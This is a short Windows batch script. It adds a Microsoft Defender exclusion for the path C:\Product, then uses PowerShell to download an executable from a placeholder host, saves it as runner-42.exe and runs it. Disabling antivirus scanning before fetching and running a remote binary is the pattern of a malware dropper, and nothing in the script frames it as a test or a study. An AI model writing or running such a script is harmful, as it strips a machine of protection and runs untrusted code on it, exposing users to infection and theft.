@echo off
cmd /c powershell -Command Add-MpPreference -ExclusionPath 'C:\Product' # %USERPROFILE%
@echo off
powershell Invoke-WebRequest https://download.invalid/setup -OutFile runner-42.exe
cmd /c runner-42.exe
